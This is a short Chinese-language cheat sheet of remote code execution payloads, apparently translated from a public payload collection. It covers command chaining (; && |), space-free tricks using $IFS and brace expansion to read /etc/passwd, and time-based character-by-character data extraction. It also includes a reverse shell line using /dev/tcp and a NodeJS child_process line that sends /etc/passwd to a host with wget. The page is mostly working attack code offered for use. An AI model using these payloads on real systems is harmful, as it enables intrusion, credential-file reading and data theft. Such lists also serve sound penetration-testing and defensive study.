# 远程代码执行
远程代码执行时一种允许攻击者执行远程服务器上代码的漏洞。
	

## Exploits
普通的远程代码执行, 执行命令以及 and voila :p
```
cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh
```

通过链接命令的代码执行
```
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
```

无空格的代码执行
```
swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
```

## 基于时间的数据渗漏
提取数据 : 逐字符
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real	0m5.007s
user	0m0.000s
sys	0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real	0m0.002s
user	0m0.000s
sys	0m0.000s
```

## 基于环境的代码执行
NodeJS代码执行
```
require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
```

## 感谢
* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
